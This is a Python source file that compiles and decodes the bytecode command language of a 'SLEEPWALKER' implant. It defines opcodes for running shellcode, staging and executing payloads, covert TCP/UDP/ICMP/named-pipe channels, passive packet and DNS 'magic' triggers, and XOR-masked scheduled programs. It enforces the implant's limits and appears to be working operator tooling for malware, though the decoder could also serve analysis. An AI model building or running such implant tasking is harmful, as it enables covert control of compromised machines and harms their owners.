"""SLEEPWALKER 23-opcode command language: DSL compiler + bytecode decoder.

The wire format matches the implant's interpreter exactly:
  * string / blob : varint length then bytes
  * u8 / u16 / u32 / u64 : fixed-width big-endian
  * lzma_properties : fixed 5 bytes
"""

from __future__ import annotations

import shlex
from dataclasses import dataclass
from typing import Optional

from .core import cron_xor

# Opcodes (must match sw_core.h).
EXIT = 0x06
SPAWN_THREAD_SCRIPT = 0x0B
SLEEP_SECONDS = 0x0C
SLEEP_RANDOM = 0x0D
CRON_SCHEDULE = 0x0E
REPEAT_N = 0x0F
LOOP_FOREVER = 0x10
DECOMPRESS_RUN = 0x1F
TCP_SEND = 0x29
UDP_SEND = 0x2A
ICMP_SEND = 0x2B
PIPE_SEND = 0x2C
STAGE_WRITE = 0x32
STAGE_VERIFY_EXEC = 0x33
RUN_SHELLCODE = 0x65
RUN_FILE_SCRIPT = 0x66
TCP_CONNECT_RECV = 0x6F
TCP_LISTEN_RECV = 0x70
UDP_BIND_RECV = 0x73
PIPE_CLIENT_RECV = 0x7D
PIPE_SERVER_RECV = 0x7E
SNIFF_MAGIC = 0x87
SNIFF_MAGIC_DNS = 0x88

_OPCODE_TO_NAME = {v: k for k, v in globals().items()
                   if isinstance(v, int) and v > 0}

# Name -> (opcode, [field kinds]); "s"=string/blob, "blob"=binary blob,
# "script"=nested program blob, "u16"/"u32"/"u64"/"u8"=fixed ints.
SPECS = {
    "EXIT": (EXIT, []),
    "SPAWN_THREAD_SCRIPT": (SPAWN_THREAD_SCRIPT, ["script"]),
    "SLEEP_SECONDS": (SLEEP_SECONDS, ["u16"]),
    "SLEEP_RANDOM": (SLEEP_RANDOM, ["u16"]),
    "CRON_SCHEDULE": (CRON_SCHEDULE, ["u64", "u32", "u32", "u8", "script"]),
    "REPEAT_N": (REPEAT_N, ["u16", "script"]),
    "LOOP_FOREVER": (LOOP_FOREVER, ["script"]),
    "DECOMPRESS_RUN": (DECOMPRESS_RUN, ["u32", "lzma", "blob"]),
    "TCP_SEND": (TCP_SEND, ["s", "s", "s", "s", "blob", "u16"]),
    "UDP_SEND": (UDP_SEND, ["s", "s", "s", "s", "blob", "u16"]),
    "ICMP_SEND": (ICMP_SEND, ["s", "s", "blob", "u16"]),
    "PIPE_SEND": (PIPE_SEND, ["s", "s", "s", "s", "blob", "u16"]),
    "STAGE_WRITE": (STAGE_WRITE, ["u32", "blob"]),
    "STAGE_VERIFY_EXEC": (STAGE_VERIFY_EXEC, ["u32", "blob"]),
    "RUN_SHELLCODE": (RUN_SHELLCODE, ["blob"]),
    "RUN_FILE_SCRIPT": (RUN_FILE_SCRIPT, ["s"]),
    "TCP_CONNECT_RECV": (TCP_CONNECT_RECV, ["s", "s", "s", "s", "u16"]),
    "TCP_LISTEN_RECV": (TCP_LISTEN_RECV, ["s", "s", "u16"]),
    "UDP_BIND_RECV": (UDP_BIND_RECV, ["s", "s", "u16"]),
    "PIPE_CLIENT_RECV": (PIPE_CLIENT_RECV, ["s", "s", "s", "s", "u16"]),
    "PIPE_SERVER_RECV": (PIPE_SERVER_RECV, ["s", "s", "u16"]),
    "SNIFF_MAGIC": (SNIFF_MAGIC, ["s", "u16"]),
    "SNIFF_MAGIC_DNS": (SNIFF_MAGIC_DNS, ["s", "u16"]),
}


def _varint(n: int) -> bytes:
    out = bytearray()
    while True:
        b = n & 0x7F
        n >>= 7
        if n:
            b |= 0x80
        out.append(b)
        if not n:
            return bytes(out)


def _parse_blob(token: str) -> bytes:
    """A string token or raw hex (`0x..` / `hex:..`)."""
    if token.startswith("0x") or token.startswith("0X"):
        return bytes.fromhex(token[2:])
    if token.startswith("hex:"):
        return bytes.fromhex(token[4:])
    if token.startswith('"') or token.startswith("'"):
        # shlex already stripped quotes; treat remaining as literal text.
        return token.encode("utf-8", "surrogateescape")
    return token.encode("utf-8", "surrogateescape")


@dataclass
class Node:
    op: int
    name: str
    fields: list  # decoded python values; nested programs are bytes (or Node)
    raw: bytes = b""


# Max payload a send op will carry.  The implant's receive envelope is
# capped at 4096 bytes, so a larger send payload can never be acknowledged.
MAX_SEND_BLOB = 4096
# DNS label hard limit (RFC 1035 and the implant's qname scanner).
MAX_DNS_LABEL = 63

_SEND_OPS = {TCP_SEND, UDP_SEND, ICMP_SEND, PIPE_SEND}


def _compile_program(tokens, pos: int, end: int, inside_block: bool = False):
    """Compile token[0..end) into (bytes, next_pos).  Handles { } nesting."""
    out = bytearray()
    i = pos
    while i < end:
        tok = tokens[i]
        if tok == "}":
            if not inside_block:
                raise ValueError(f"unexpected '}}' at token {i}")
            return bytes(out), i + 1
        name = tok.upper()
        if name not in SPECS:
            raise ValueError(f"unknown instruction {tok!r} at token {i}")
        opcode, kinds = SPECS[name]
        out.append(opcode)
        i += 1
        for kind in kinds:
            if i >= end:
                raise ValueError(f"{name}: missing operand ({kind})")
            if kind in ("script",):
                if tokens[i] != "{":
                    # Inline nested program: a single token of raw hex, or a
                    # quoted/hex blob is not supported here; require a block.
                    raise ValueError(f"{name}: expected '{{' for nested script")
                i += 1
                nested, i = _compile_program(tokens, i, end, inside_block=True)
                if tokens[i - 1] != "}":
                    raise ValueError(f"{name}: unterminated nested script block")
                # CRON_SCHEDULE stores its nested program XOR-masked; the
                # interpreter XORs it before running (decrypt/run/re-encrypt).
                if opcode == CRON_SCHEDULE:
                    nested = cron_xor(nested)
                out += _varint(len(nested)) + nested
            elif kind == "lzma":
                if tokens[i] == "{":
                    raise ValueError(f"{name}: lzma_properties is a fixed 5-byte value")
                props = _parse_blob(tokens[i])
                if len(props) != 5:
                    raise ValueError(f"{name}: lzma_properties must be 5 bytes")
                out += props
                i += 1
            elif kind in ("blob",):
                data = _parse_blob(tokens[i])
                if opcode in _SEND_OPS and len(data) > MAX_SEND_BLOB:
                    raise ValueError(
                        f"{name}: payload is {len(data)} bytes; "
                        f"implant send cap is {MAX_SEND_BLOB}")
                out += _varint(len(data)) + data
                i += 1
            elif kind == "s":
                s = tokens[i]
                if opcode == SNIFF_MAGIC_DNS and len(s.encode("utf-8")) > MAX_DNS_LABEL:
                    raise ValueError(
                        f"{name}: DNS filter/label is {len(s.encode('utf-8'))} bytes; "
                        f"max DNS label is {MAX_DNS_LABEL}")
                b = s.encode("utf-8", "surrogateescape")
                out += _varint(len(b)) + b
                i += 1
            elif kind == "u8":
                out.append(int(tokens[i], 0) & 0xFF)
                i += 1
            elif kind == "u16":
                out += int(tokens[i], 0).to_bytes(2, "big")
                i += 1
            elif kind == "u32":
                out += int(tokens[i], 0).to_bytes(4, "big")
                i += 1
            elif kind == "u64":
                out += int(tokens[i], 0).to_bytes(8, "big")
                i += 1
    if inside_block:
        raise ValueError("unterminated '{' block")
    return bytes(out), i


def compile_program(text: str) -> bytes:
    """Compile a DSL program (one instruction per line, with { } nesting)."""
    tokens = []
    for line in text.splitlines():
        line = line.strip()
        # Strip inline comments (everything from the first '#').
        idx = line.find("#")
        if idx != -1:
            line = line[:idx].rstrip()
        if not line:
            continue
        # posix=False keeps backslashes so Windows paths (RUN_FILE_SCRIPT,
        # PIPE_SEND, ...) survive intact; shlex still groups quoted tokens,
        # so strip the surrounding quotes afterwards.
        tokens.extend(t.strip("'\"") for t in shlex.split(line, posix=False))
    out, pos = _compile_program(tokens, 0, len(tokens))
    if pos != len(tokens):
        raise ValueError(
            f"unexpected token {tokens[pos]!r} after program end "
            f"(stray '}}' or extra operand)")
    return out


# --------------------------------------------------------------------------
# Decoder (annotated tree) - mirrors the interpreter's read order.
# --------------------------------------------------------------------------
class Reader:
    def __init__(self, data: bytes):
        self.data = data
        self.pos = 0

    def take(self, n: int) -> bytes:
        if self.pos + n > len(self.data):
            raise ValueError("truncated bytecode")
        v = self.data[self.pos:self.pos + n]
        self.pos += n
        return v

    def u(self, n: int) -> int:
        return int.from_bytes(self.take(n), "big")

    def varint(self) -> int:
        v = 0
        shift = 0
        while True:
            b = self.take(1)[0]
            v |= (b & 0x7F) << shift
            if not (b & 0x80):
                return v
            shift += 7

    def blob(self) -> bytes:
        n = self.varint()
        return self.take(n)

    def string(self) -> str:
        return self.blob().decode("utf-8", "replace")


def _decode_program(r: Reader, depth: int) -> list:
    nodes = []
    while r.pos < len(r.data):
        op = r.u(1)
        name = _OPCODE_TO_NAME.get(op, f"UNKNOWN(0x{op:02x})")
        kinds = SPECS.get(name, (None, []))[1]
        fields = []
        for kind in kinds:
            if kind == "script":
                nested = r.blob()
                # CRON_SCHEDULE stores its nested program XOR-masked; undo it
                # so the decoded tree shows the plaintext program.
                if op == CRON_SCHEDULE:
                    nested = cron_xor(nested)
                nr = Reader(nested)
                fields.append(("script", _decode_program(nr, depth + 1)))
            elif kind == "lzma":
                fields.append(("lzma_properties", r.take(5)))
            elif kind == "blob":
                fields.append(("blob", r.blob()))
            elif kind == "s":
                fields.append(("string", r.string()))
            elif kind == "u8":
                fields.append(("u8", r.u(1)))
            elif kind == "u16":
                fields.append(("u16", r.u(2)))
            elif kind == "u32":
                fields.append(("u32", r.u(4)))
            elif kind == "u64":
                fields.append(("u64", r.u(8)))
        nodes.append(Node(op=op, name=name, fields=fields))
    return nodes


def decode_program(data: bytes) -> list:
    return _decode_program(Reader(data), 0)


def render_tree(nodes: list, indent: int = 0) -> str:
    pad = "  " * indent
    lines = []
    for n in nodes:
        lines.append(f"{pad}{n.name} (0x{n.op:02x})")
        for label, val in n.fields:
            if label == "script":
                lines.append(f"{pad}  nested program:")
                lines.append(render_tree(val, indent + 2))
            elif label == "string":
                lines.append(f"{pad}  string = {val!r}")
            elif label == "blob":
                lines.append(f"{pad}  blob = {val.hex()}")
            elif label == "lzma_properties":
                lines.append(f"{pad}  lzma_properties = {val.hex()}")
            else:
                lines.append(f"{pad}  {label} = {val}")
    return "\n".join(lines)
